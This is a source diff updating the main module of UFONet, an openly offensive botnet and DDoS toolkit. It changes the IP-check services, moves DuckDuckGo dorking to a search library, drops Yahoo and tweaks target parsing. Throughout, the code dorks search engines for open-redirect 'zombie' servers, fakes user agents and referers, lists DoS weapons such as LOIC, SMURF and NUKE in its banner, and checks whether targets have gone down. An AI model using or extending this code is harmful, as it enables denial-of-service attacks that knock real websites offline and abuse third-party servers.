@@ -3,7 +3,7 @@
 """
 This file is part of the UFONet project, https://ufonet.03c8.net
 
-Copyright (c) 2013/2022 | psy <epsylon@riseup.net>
+Copyright (c) 2013/2024 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
@@ -11,8 +11,13 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import os, sys, re, traceback, random, time, threading, base64, string, math
 import io, socket, ssl, cgi, json, gzip
-from Crypto.Cipher import AES
+
 from hashlib import sha1, sha256
+try:
+    from Cryptodome.Cipher import AES
+except:
+    print ("\n[Error] Something wrong with -crypto- libs... Aborting!\n")
+    sys.exit()
 try:
     from urllib.parse import urlparse as urlparse
 except:
@@ -60,12 +65,12 @@ class UFONet(object):
         self.GIT_REPOSITORY = 'https://code.03c8.net/epsylon/ufonet' # oficial code source [OK! 22/12/2018]
         self.GIT_REPOSITORY2 = 'https://github.com/epsylon/ufonet' # mirror source [since: 04/06/2018]
         self.github_zombies = 'https://raw.githubusercontent.com/epsylon/ufonet/master/botnet/' # default [RAW] download/upload zombies [Blackhole] [GitHub] [DIY]
-        self.external_check_service1 = 'https://www.isitdownrightnow.com/' # set external check service 1 [OK! 23/07/2022]
-        self.external_check_service2 = 'https://downforeveryoneorjustme.com/' # set external check service 2 [OK! 23/07/2022]
-        self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site [OK! 23/07/2022]
-        self.check_ip_service1 = 'https://checkip.org/' # set external check ip service 1 [OK! 23/07/2022]
-        self.check_ip_service2 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020]
-        self.check_ip_service3 = 'https://ip.42.pl/ra' # set external check ip service 3 [OK! [23/07/2022]
+        self.external_check_service1 = 'https://www.isitdownrightnow.com/check.php?domain=' # set external check service 1 [OK! 20/08/2024]
+        self.external_check_service2 = 'https://isitdownorjustme.net/status/' # set external check service 2 [OK! 23/07/2022]
+        self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site [OK! 23/07/2022] [OK! 25/08/2024]
+        self.check_ip_service2 = 'https://checkip.org/' # set external check ip service 1 [OK! 23/07/2022] [OK! 25/08/2024]
+        self.check_ip_service1 = 'https://ip.42.pl/ra' # set external check ip service 2 [OK! [23/07/2022] [OK! 25/08/2024]
+        #self.check_ip_service3 = 'https://whatismyip.org/' # set external check ip service 2 [OK! 06/06/2020] [OK! 25/08/2024]
         self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
         self.motherships_file = 'core/txt/motherships.txt' # set source path to retrieve mothership names
         self.zombies_file = 'botnet/zombies.txt' # set source path to retrieve [Zombies]
@@ -212,29 +217,29 @@ class UFONet(object):
         return self.options
 
     def banner_welcome(self):
-        print("                     ____                                                                        ")
-        print("          ||        / /\ \      ||              #===============================================#")
-        print("        -(00)-     + (XX) +   -(00)-            ||                                             ||")
-        print("   ||     ||   O ==*~~~~~~*== 0 ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
-        print(" -(00)-          (0)  XX  (0)           -(00)-  ||                                             ||")
-        print("   ||    _     _  \| (00) |/  _     _     ||    ||     |-> ZOMBIES    #     |-> LOIC           ||")
-        print("        (O)_  (O)  0'----'0  (O)  _(O)          ||     |-> DROIDS     #     |-> LORIS          ||")   
-        print("            |  |.''.( xx ).''.|  |              ||     |-> ALIENS     #     |-> UFOSYN         ||")
-        print("            .'.'  +X|'..'|X+  '.'.              ||     |-> UCAVs      #     |-> XMAS           ||")
-        print("     .-.  .' /'--.__|_00_|__.--'\ '.  .-.       ||     |-> X-RPCs     #     |-> NUKE           ||")
-        print("   +(O).)-|0|  \   x| ## |x   /  |0|-(.(O)+     ||     |-> DBSTRESS   #     |-> UFOACK         ||")
-        print("     `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'       ||     |-> SPRAY      #     |-> UFORST         ||")
-        print("        _ | ||  '-.___||___.-'  || | _          ||     |-> SMURF      #     |-> DROPER         ||")
-        print("     .' _ | ||==O |   __   | O==|| | _ '.       ||     |-> TACHYON    #     |-> OVERLAP        ||")
-        print("    / .' ''.|  || | /_00_\ | ||  |.'' '. \      ||     |-> MONLIST    #     |-> PINGER         ||")
-        print(" _  | '###  |  =| | ###### | |=  |' ###  |  _   ||     |-> FRAGGLE    #     |-> UFOUDP         ||")
-        print("(0)-| |(0)| '.  0\||__**_ ||/0  .' |(0)| |-(0)  ||     |-> SNIPER     #                        ||")
-        print(" *  \ '._.'   '.  | \_##_/ |  .'   '._.' /  *   ||                                             ||")
-        print("     '.__ ____0_'.|__'--'__|.'_0____ __.'       #|=============================================|#")
-        print("    .'_.-|            YY            |-._'.      ||                                             ||")
-        print("                                                ||  -> [ UFONet: https://ufonet.03c8.net ] <-  ||") 
-        print("   + Class: PSYoPs / "+str(self.mothership_model)+" +     ||                                             ||")
-        print("                                                #|=============================================|#") 
+        print(r"                     ____                                                                        ")
+        print(r"          ||        / /\ \      ||              #===============================================#")
+        print(r"        -(00)-     + (XX) +   -(00)-            ||                                             ||")
+        print(r"   ||     ||   O ==*~~~~~~*== 0 ||        ||    ||  > Botnet [DDoS]   #  > Close Combat [DoS]  ||")
+        print(r" -(00)-     O|O  (0)  XX  (0)           -(00)-  ||                                             ||")
+        print(r"   ||  _____ |____\| (00) |/______|D___   ||    ||     |-> ZOMBIES    #     |-> LOIC           ||")
+        print(r"     O+!$(O)! (O)  0'----'0  (O) !(O)$!+O       ||     |-> DROIDS     #     |-> LORIS          ||")   
+        print(r"       |OO OO|  .''.( xx ).''.  |OO OO|         ||     |-> ALIENS     #     |-> UFOSYN         ||")
+        print(r"      **+***.'.'  +X|'..'|X+  '.'***+**.        ||     |-> UCAVs      #     |-> XMAS           ||")
+        print(r"     .-.  .' /'--.__|_00_|__.--'\ '.  .-.       ||     |-> X-RPCs     #     |-> NUKE           ||")
+        print(r"   +(O).)-|0|  \   x| ## |x   /  |0|-(.(O)+     ||     |-> DBSTRESS   #     |-> UFOACK         ||")
+        print(r"     `-'  '-'-._'-./ -00- \.-'_.-'-'  `-'       ||     |-> SPRAY      #     |-> UFORST         ||")
+        print(r"        _ | ||  '-.___||___.-'  || | _          ||     |-> SMURF      #     |-> DROPER         ||")
+        print(r"     .' _ | ||==O |   __   | O==|| | _ '.       ||     |-> TACHYON    #     |-> OVERLAP        ||")
+        print(r"    / .' ''.|  || | /_00_\ | ||  |.'' '. \      ||     |-> MONLIST    #     |-> PINGER         ||")
+        print(r" _  | '###  |  =| | ###### | |=  |' ###  |  _   ||     |-> FRAGGLE    #     |-> UFOUDP         ||")
+        print(r"(0)-| |(0)| '.  0\||__**_ ||/0  .' |(0)| |-(0)  ||     |-> SNIPER     #                        ||")
+        print(r" *  \ '._.'   '.  | \_##_/ |  .'   '._.' /  *   ||                                             ||")
+        print(r"     '.__ ____0_'.|__'--'__|.'_0____ __.'       #|=============================================|#")
+        print(r"    .'_.-|            YY            |-._'.      ||                                             ||")
+        print(r"                                                ||  -> [ UFONet: https://ufonet.03c8.net ] <-  ||") 
+        print(r"   + Class: PSYoPs / "+str(self.mothership_model)+" +   ||                                             ||")
+        print(r"                                                #|=============================================|#") 
         print("")
 
     def banner(self):
@@ -298,15 +303,14 @@ class UFONet(object):
         except:
             private_ip = "Unknown"
         try:
-            public_ip = requests.get(self.check_ip_service3).text
+            public_ip = requests.get(self.check_ip_service1).text
+            public_ip = re.compile(r'(\d+\.\d+\.\d+\.\d+)').search(public_ip).group(1)
         except:
             try:
                 public_ip = requests.get(self.check_ip_service2).text
+                public_ip = re.compile(r'(\d+\.\d+\.\d+\.\d+)').search(public_ip).group(1)
             except:
-                try:
-                    public_ip = requests.get(self.check_ip_service1).text
-                except:
-                    public_ip = "Unknown"
+                public_ip = "Unknown"
         return private_ip, public_ip
 
     def try_running(self, func, error, args=None):
@@ -337,9 +341,9 @@ class UFONet(object):
             self.agents.append(agent)
         self.user_agent = random.choice(self.agents).strip()
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [13/07/2021: OK!]
-        self.search_engines.append('yahoo') # [13/07/2021: OK!]
-        self.search_engines.append('duck') # [13/07/2021: OK!]
+        self.search_engines.append('bing') # [13/07/2021: OK!] [25/08/2024 OK!]
+        #self.search_engines.append('yahoo') # [13/07/2021: OK!] [25/08/2024: tracking remote url origin]
+        self.search_engines.append('duck') # [13/07/2021: OK!] [25/08/2024 OK!]
         #self.search_engines.append('startpage') # [01/02/2020: deprecated! -> blocking instream params search]
         #self.search_engines.append('yandex') # [03/02/2018: deprecated! -> captchasound]
         #self.search_engines.append('google') # [09/08/2016: modified -> not working from TOR]
@@ -421,7 +425,7 @@ class UFONet(object):
         proxy = options.proxy
         if options.proxy:
             try:
-                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
+                pattern = r'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                 m = re.search(pattern, proxy)
                 if m is None:
                     self.banner()
@@ -461,25 +465,25 @@ class UFONet(object):
         if options.cryptomsg:
             from core.tools.crypter import Cipher
             print("  " + '='*44)
-            print("                                            ")
-            print("          ____...------------...____        ")
-            print("     _.-'' /o/__ ____ __ __  __ \o\_`'-._   ")
-            print("   .'     / /                    \ \     '. ")
-            print("   |=====/o/======================\o\=====| ")
-            print("   |____/_/________..____..________\_\____| ")
-            print("   /   _/ \_     <_o#\__/#o_>     _/ \_   \ ")
-            print("   \__/_____\####/0213411543/####/_____\__/ ")
-            print("    |===\!/========================\!/===|  ")
-            print("    |   |=|          .---.         |=|   |  ")
-            print("    |===|o|=========/     \========|o|===|  ")
-            print("    |   | |         \() ()/        | |   |  ")
-            print("    |===|o|======{'-.) A (.-'}=====|o|===|  ")
-            print("    | __/ \__     '-.\\uuu/.-'    __/ \__ |  ")
-            print("    |==== .'.'^'.'.====|====.'.'^'.'.====|  ")
-            print("    |  _\o/   __  {.' __  '.} _   _\o/  _|  ")
-            print("    ''''''''''''''''''''''''''''''''''''''  ")
-            print("\n     + UFONet Crypter (AES256+HMAC-SHA1)")
-            print("  (140 plain text chars = 69 encrypted chars)\n")
+            print(r"                                            ")
+            print(r"          ____...------------...____        ")
+            print(r"     _.-'' /o/__ ____ __ __  __ \o\_`'-._   ")
+            print(r"   .'     / /                    \ \     '. ")
+            print(r"   |=====/o/======================\o\=====| ")
+            print(r"   |____/_/________..____..________\_\____| ")
+            print(r"   /   _/ \_     <_o#\__/#o_>     _/ \_   \ ")
+            print(r"   \__/_____\####/0213411543/####/_____\__/ ")
+            print(r"    |===\!/========================\!/===|  ")
+            print(r"    |   |=|          .---.         |=|   |  ")
+            print(r"    |===|o|=========/     \========|o|===|  ")
+            print(r"    |   | |         \() ()/        | |   |  ")
+            print(r"    |===|o|======{'-.) A (.-'}=====|o|===|  ")
+            print(r"    | __/ \__    '-.\\uuu/.-'    __/ \__ |  ")
+            print(r"    |==== .'.'^'.'.====|====.'.'^'.'.====|  ")
+            print(r"    |  _\o/   __  {.' __  '.} _   _\o/  _|  ")
+            print(r"    ''''''''''''''''''''''''''''''''''''''  ")
+            print(r"     + UFONet Crypter (AES256+HMAC-SHA1)")
+            print(r"  (140 plain text chars = 69 encrypted chars)")
             print("  " + '='*44 + "\n")
             text = str(input("-> Enter TEXT: "))
             input_key = str(input("\n-> Enter KEY: "))
@@ -507,7 +511,9 @@ class UFONet(object):
             private_ip, public_ip = self.show_ips()
             print("|- IP Private  :", private_ip)
             print("|" +"-"*34)
-            t = urlparse(self.check_ip_service3)
+            self.check_ip_services = [self.check_ip_service1, self.check_ip_service2] # shuffle check ip services
+            self.check_ip_service = random.choice(self.check_ip_services).strip() # shuffle user-agent
+            t = urlparse(self.check_ip_service)
             name_service = t.netloc
             print("|- IP Public   :", public_ip +" | ["+name_service+"]")
             print("-"*35)
@@ -3827,8 +3833,17 @@ class UFONet(object):
             url = url + data
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.num_results: # set number of results to search
+                try:
+                    num_results = int(options.num_results)
+                except:
+                    print("[Info] [AI] You should specify an integer!... Using default value: 10\n")
+                    num_results = 10
+            else:
+                num_results = 10
             if options.verbose:
-                print(("[Info] [AI] [DORKING] Query used: " + url + "\n"))
+                print("[Info] [AI] [DORKING] Query used: " + url + " (POST: "+ data + ")")
+                print("[Info] [AI] [DORKING] Max results: " +str(num_results)+"\n")
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
@@ -3850,69 +3865,69 @@ class UFONet(object):
                     for e in self.search_engines:
                         print("+ "+e)
                     print('-'*25)
-                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
+                    print("\nEx: ufonet -s 'page.php?url=' --se 'bing'")
                     return #sys.exit(2)
                 else:
                     req_reply = ''
-            regex = '<li class="b_algo"><h2><a href="(.+?)">' # regex magics
+            regex = '</a></div><h2><a href="(.+?)">' # regex magics [25/08/2024 OK!]
             pattern = re.compile(regex)
             url_links = re.findall(pattern, req_reply)
-        elif options.engine == 'yahoo': # yahoo [28/02/2019: OK!]
-            location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # evading Yahoo anti-dorking [grey magic: 28/02/2019]
-            #location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
-            location = str(random.choice(location).strip()) # shuffle location
-            if location == "jp": # [28/02/2019]
-                url = 'https://search.yahoo.co.jp/search?'
-            else:
-                url = 'https://'+location+'.search.yahoo.com/search?'            
-            if options.search: # search from query
-                if location == "jp":
-                    q = '"' + str(options.search) + '"' # set query to search literally on results
-                else:
-                    q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
-            if options.dorks or options.autosearch: # search from a dork
-                if location == "jp":
-                    q = '"' + str(dork) + '"' # set query to search literally on results
-                else:
-                    q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
-            start = 0 # set index number of first entry
-            query_string = { 'p':q, 'b':start }
-            data = urllib.parse.urlencode(query_string)
-            url = url + data
-            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
-            if options.verbose:
-                print(("[Info] [AI] [DORKING] Query used: " + url + "\n"))
-            try:
-                if options.proxy: # set proxy
-                    self.proxy_transport(options.proxy)
-                req = urllib.request.Request(url, None, headers)
-                req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
-            except:
-                print('[Error] [AI] Unable to connect to: yahoo\n')
-                if options.allengines or options.autosearch:
-                    return
-                if not options.dorks or not options.autosearch:
-                    if not self.options.forceyes:
-                        update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
-                    else:
-                        update_reply = "Y"
-                    if update_reply == "n" or update_reply == "N":
-                        return #sys.exit(2)
-                    print("\nSearch engines available:")
-                    print('-'*25)
-                    for e in self.search_engines:
-                        print("+ "+e)
-                    print('-'*25)
-                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'bing'")
-                    return #sys.exit(2)
-                else:
-                    req_reply = ''
-            #regex = '<h3 class="title"><a style="color:#2C46C7" class=" td-u" href="(.+?)" target="_blank"' # regex magics [18/08/2016]
-            regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
-            pattern = re.compile(regex)
-            url_links = re.findall(pattern, req_reply)
-        elif options.engine == 'duck': # using duckduckgo [28/02/2019: OK!]
+        #elif options.engine == 'yahoo': # yahoo [28/02/2019: OK!]
+        #    location = ['fr', 'de', 'es', 'nl', 'it', 'se', 'ch', 'jp', 'ru', 'lt'] # evading Yahoo anti-dorking [grey magic: 28/02/2019]
+        #    #location = ['fr', 'de', 'es', 'nl', 'se', 'ch', 'ru'] # [08/04/2017]
+        #    location = str(random.choice(location).strip()) # shuffle location
+        #    if location == "jp": # [28/02/2019]
+        #        url = 'https://search.yahoo.co.jp/search?'
+        #    else:
+        #        url = 'https://'+location+'.search.yahoo.com/search?'            
+        #    if options.search: # search from query
+        #        if location == "jp":
+        #            q = '"' + str(options.search) + '"' # set query to search literally on results
+        #        else:
+        #            q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
+        #    if options.dorks or options.autosearch: # search from a dork
+        #        if location == "jp":
+        #            q = '"' + str(dork) + '"' # set query to search literally on results
+        #        else:
+        #            q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
+        #    start = 0 # set index number of first entry
+        #    query_string = { 'p':q, 'b':start }
+        #    data = urllib.parse.urlencode(query_string)
+        #    url = url + data
+        #    self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+        #    headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+        #    if options.verbose:
+        #        print(("[Info] [AI] [DORKING] Query used: " + url + "\n"))
+        #    try:
+        #        if options.proxy: # set proxy
+        #            self.proxy_transport(options.proxy)
+        #        req = urllib.request.Request(url, None, headers)
+        #        req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
+        #    except:
+        #        print('[Error] [AI] Unable to connect to: yahoo\n')
+        #        if options.allengines or options.autosearch:
+        #            return
+        #        if not options.dorks or not options.autosearch:
+        #            if not self.options.forceyes:
+        #                update_reply = input("[AI] Do you want to try a different search engine? (Y/n)")
+        #            else:
+        #                update_reply = "Y"
+        #            if update_reply == "n" or update_reply == "N":
+        #                return #sys.exit(2)
+        #            print("\nSearch engines available:")
+        #            print('-'*25)
+        #            for e in self.search_engines:
+        #                print("+ "+e)
+        #            print('-'*25)
+        #            print("\nEx: ufonet -s 'page.php?url=' --se 'bing'")
+        #            return #sys.exit(2)
+        #        else:
+        #            req_reply = ''
+        #    #regex = '<h3 class="title"><a style="color:#2C46C7" class=" td-u" href="(.+?)" target="_blank"' # regex magics [18/08/2016]
+        #    regex = 'href="(.+?)" target="_blank" data' # regex magics [08/04/2017]
+        #    pattern = re.compile(regex)
+        #    url_links = re.findall(pattern, req_reply)
+        elif options.engine == 'duck': # using duckduckgo [28/02/2019: OK!] [25/08/2024 OK!]
             url = 'https://duckduckgo.com/html/'
             if options.search: # search from query
                 q = 'instreamset:(url):"' + str(options.search) + '"' # set query to search literally on results
@@ -3920,15 +3935,22 @@ class UFONet(object):
                 q = 'instreamset:(url):"' + str(dork) + '"' # set query from a dork to search literally on results
             query_string = { 'q':q }
             data = urllib.parse.urlencode(query_string)
-            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
-            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            from duckduckgo_search import DDGS # import search engine wrapper lib
+            if options.num_results: # set number of results to search
+                try:
+                    num_results = int(options.num_results)
+                except:
+                    print("[Info] [AI] You should specify an integer!... Using default value: 10\n")
+                    num_results = 10
+            else:
+                num_results = 10
             if options.verbose:
-                print("[Info] [AI] [DORKING] Query used: " + url + " (POST: "+ data + ")\n")
+                print("[Info] [AI] [DORKING] Query used: " + url + " (POST: "+ data + ")")
+                print("[Info] [AI] [DORKING] Max results: " +str(num_results)+"\n")
             try:
                 if options.proxy: # set proxy
                     self.proxy_transport(options.proxy)
-                req = urllib.request.Request(url, data.encode('utf-8'), headers) # HTTP POST request
-                req_reply = urllib.request.urlopen(req, context=self.ctx).read().decode('utf-8')
+                req_reply = DDGS().text(data, safesearch='Off', max_results=num_results)
             except:
                 print('[Error] [AI] Unable to connect to: duck\n')
                 if options.allengines or options.autosearch:
@@ -3945,13 +3967,15 @@ class UFONet(object):
                     for e in self.search_engines:
                         print("+ "+e)
                     print('-'*25)
-                    print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
+                    print("\nEx: ufonet -s 'page.php?url=' --se 'bing'")
                     return #sys.exit(2)
                 else:
                     req_reply = ''
-            regex = 'snippet" href="(.+?)">' # regex magics
-            pattern = re.compile(regex)
-            url_links = re.findall(pattern, req_reply)
+            url_links = []
+            for url_reply in req_reply:
+                for key,value in url_reply.items():
+                    if key == "href":
+                        url_links.append(value)
         else: # no valid search engine
             print('[Error] [AI] This search engine is not supported!\n')
             if not options.dorks or options.autosearch:
@@ -3966,7 +3990,7 @@ class UFONet(object):
                 for e in self.search_engines:
                     print("+ "+e)
                 print('-'*25)
-                print("\nEx: ufonet -s 'proxy.php?url=' --se 'yahoo'")
+                print("\nEx: ufonet -s 'page.php?url=' --se 'bing'")
                 return #sys.exit(2)
             else:
                 req_reply = ''
@@ -3985,11 +4009,11 @@ class UFONet(object):
             if options.engine == "bing":
                 if " h=" in url: # regex magics [18/08/2016]
                     url = url.rsplit('" h=',1)[0]
-            if options.engine == "yahoo":
-                if 'RU=' in url: # regex magics [18/08/2016]
-                    url = url.rsplit('RU=',1)[1] 
-                if 'UTF-8&u=' in url: # regex magics [05/02/2018]
-                    url = url.rsplit('UTF-8&u=',1)[1]  
+            #if options.engine == "yahoo":
+            #    if 'RU=' in url: # regex magics [18/08/2016]
+            #        url = url.rsplit('RU=',1)[1] 
+            #    if 'UTF-8&u=' in url: # regex magics [05/02/2018]
+            #        url = url.rsplit('UTF-8&u=',1)[1]  
             total_results = total_results + 1 # results counter
             url_link = urllib.parse.unquote(url) # unquote encoding
             if options.search:
@@ -4415,7 +4439,10 @@ class UFONet(object):
                 param = re.findall(pattern_param, alien) # HTTP POST params to submit
                 for u in alien_url:
                     url = u # ex: POST -> path/submit.php
-                t = urlparse(url)
+                try:
+                    t = urlparse(url)
+                except:
+                    pass
                 name_alien = t.netloc
                 if name_alien == "":
                     name_alien = alien
@@ -5215,6 +5242,8 @@ class UFONet(object):
         return disc_zombies
 
     def parse_url_encoding(self, target):
+        if not target.startswith("http"):
+            target = "http://" + target 
         t = urlparse(target)
         host = urllib.parse.quote(t.netloc.encode('utf-8'))
         path = urllib.parse.quote(t.path.encode('utf-8'))
@@ -5408,7 +5437,7 @@ class UFONet(object):
                 self.payload = False
                 if "https://www.whitehouse.gov" in payload_reply: #Open Redirect reply [requested by all UFONet motherships ;-)]
                     num_waiting_zombies = num_waiting_zombies + 1
-                    print("Status:", "Waiting for orders... ;-)")
+                    print("Status:", "Awaiting for orders... ;-)")
                     zombies_ready.append(zombie)
                 else:
                     num_disconnected_zombies = num_disconnected_zombies + 1
@@ -5510,7 +5539,7 @@ class UFONet(object):
             # send Open Redirect injection (multiple zombies > one target url)
             reply = self.injection(target, zombies)
         else:
-            print("\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n")
+            print("\n[Error] [AI] Target not valid (add protocol prefix http(s)://): "+target+" -> [Discarding!]\n")
 
     def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, fraggle, xmas, ufoack, uforst, droper, overlap, pinger, ufoudp, nuke, tachyon, monlist, sniper):
         # perform some other extra attacks (such as DoS techniques)
@@ -5865,7 +5894,7 @@ class UFONet(object):
                     else:
                         target = target.replace("https://", "")
                     try:
-                        url = self.external_check_service1 + target + ".html" # check from external service [1] [23/07/2022]
+                        url = self.external_check_service1 + target  # check from external service [1] [23/07/2022]
                         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                         if options.proxy: # set proxy
@@ -5886,7 +5915,7 @@ class UFONet(object):
                         req = urllib.request.Request(url, None, headers)
                         try:
                             req_reply = urllib.request.urlopen(req, context=self.ctx).read()
-                            if b"It's just you" in req_reply:
+                            if b"Currently Up" in req_reply:
                                 t = urlparse(self.external_check_service2)
                                 name_external2 = t.netloc
                                 print("[Info] [AI] [Control] From OTHERS: YES -> ["+name_external2+"]")
